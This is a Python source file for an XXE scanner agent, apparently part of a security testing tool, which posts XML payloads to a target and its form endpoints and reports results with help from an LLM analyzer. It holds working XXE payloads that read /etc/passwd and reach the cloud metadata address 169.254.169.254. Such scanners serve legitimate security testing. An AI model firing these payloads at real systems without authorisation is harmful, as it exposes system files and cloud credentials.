"""XXE Agent — XML External Entity injection scanner"""
from briar.agents.analyzer import SecurityAnalyzer
from briar.core.http import HTTPClient


class XXEAgent:
    """Discovers XML External Entity vulnerabilities with real payload injection"""

    FILE_PAYLOAD = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<r>&xxe;</r>'
    )
    SSRF_PAYLOAD = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>'
        '<r>&xxe;</r>'
    )
    XML_PARSER_ERRORS = [
        "DOCTYPE is not allowed",
        "Premature end of file",
        "must be well-formed",
        "org.xml.sax",
        "SAXParseException",
        "lxml.etree",
        "XMLSyntaxError",
        "simplexml_load",
        "DOMDocument",
        "xmlParseEntityRef",
        "Start tag expected",
    ]

    def __init__(self, provider="ollama"):
        self.analyzer = SecurityAnalyzer(provider)
        self.http = HTTPClient(timeout=10)
        self.name = "XXE"

    def scan(self, url: str, tech_context: str = "", **kwargs) -> dict:
        findings = []
        targets = [url]

        # Discover XML-accepting forms / endpoints from the landing page
        try:
            page = self.http.get(url)
            for form in self.http.extract_forms(page.text):
                action = form.get("action") or ""
                if action and action not in targets:
                    targets.append(action)
        except Exception:
            pass

        headers = {"Content-Type": "application/xml"}

        for target in targets[:5]:
            # 1) File read via XXE
            try:
                resp = self.http.post(target, data=self.FILE_PAYLOAD, headers=headers)
                file_hit = self.http.detect_file_content(resp.text)
                if file_hit or "root:" in resp.text:
                    findings.append({
                        "type": "XXE file disclosure",
                        "severity": "Critical",
                        "endpoint": target,
                        "payload": self.FILE_PAYLOAD,
                        "evidence": file_hit or "root: present in response",
                        "status": resp.status_code,
                    })
                else:
                    parser_err = self._xml_parser_error(resp.text)
                    if parser_err:
                        findings.append({
                            "type": "XML parser exposed",
                            "severity": "Low",
                            "endpoint": target,
                            "payload": self.FILE_PAYLOAD,
                            "evidence": parser_err,
                            "status": resp.status_code,
                        })
            except Exception:
                pass

            # 2) SSRF via XXE (cloud metadata)
            try:
                resp = self.http.post(target, data=self.SSRF_PAYLOAD, headers=headers)
                text = resp.text.lower()
                if any(m in text for m in ("ami-id", "instance-id", "computemetadata", "meta-data")):
                    findings.append({
                        "type": "XXE SSRF (cloud metadata)",
                        "severity": "Critical",
                        "endpoint": target,
                        "payload": self.SSRF_PAYLOAD,
                        "evidence": "Cloud metadata reflected via XXE",
                        "status": resp.status_code,
                    })
            except Exception:
                pass

        analysis = f"XXE scan complete for {url}\n\n"
        if findings:
            analysis += f"**{len(findings)} issues found:**\n\n"
            for f in findings:
                analysis += f"- {f.get('type','?')} ({f.get('severity','?')}) at {f.get('endpoint','?')}\n"
        else:
            analysis += "No issues detected.\n"
        analysis += "\n---\n\nLLM analysis:\n"
        result = self.analyzer.analyze_endpoint(url, "GET", tech_context=tech_context, source_hint=analysis)
        result["real_findings"] = findings
        result["agent"] = self.name
        result["type"] = "XML External Entity"
        result["severity"] = self._severity(findings)
        return result

    def _xml_parser_error(self, text: str) -> str:
        for err in self.XML_PARSER_ERRORS:
            if err.lower() in text.lower():
                return err
        return ""

    @staticmethod
    def _severity(findings):
        for s in ["Critical", "High", "Medium", "Low", "Info"]:
            if any(f.get("severity") == s for f in findings):
                return s
        return "Info"
